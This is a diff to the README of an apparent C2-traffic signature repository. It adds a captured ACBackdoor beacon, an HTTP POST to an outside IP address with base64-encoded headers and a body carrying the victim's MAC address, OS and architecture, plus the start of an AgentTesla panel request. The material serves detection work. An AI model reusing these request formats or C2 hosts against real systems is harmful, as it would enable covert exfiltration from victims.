@@ -1,5 +1,26 @@
 ### A repo for matching on known c2 and exfil traffic keywords (ctrl+f to search)
 
+#### ACBackdoor
+~~~
+POST / HTTP/1.1
+Host: 193.29.15.147
+User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; .NET CLR 1.1.4322)
+Accept: */*
+Access-Control: aW5mbw==
+X-Access: c22ed12456e9eb9844eafe80f3d8c080
+Content-Length: 48
+Content-Type: application/x-www-form-urlencoded
+
+NTI6NTQ6MDA6NEE6QUQ6MjEKV2luZG93cwp4ODZfNjQKMC41
+
+HTTP/1.1 200 OK
+Server: nginx
+Content-Type: text/html; charset=UTF-8
+Date: Mon, 11 Nov 2019 13:55:27 GMT
+Content-Length: 0
+~~~
+![alt text](https://github.com/silence-is-best/c2db/blob/master/images/acbackdoor.png "ACBackdoor")
+
 #### AgentTesla http:
 ~~~
 POST /zin/WebPanel/api.php HTTP/1.1
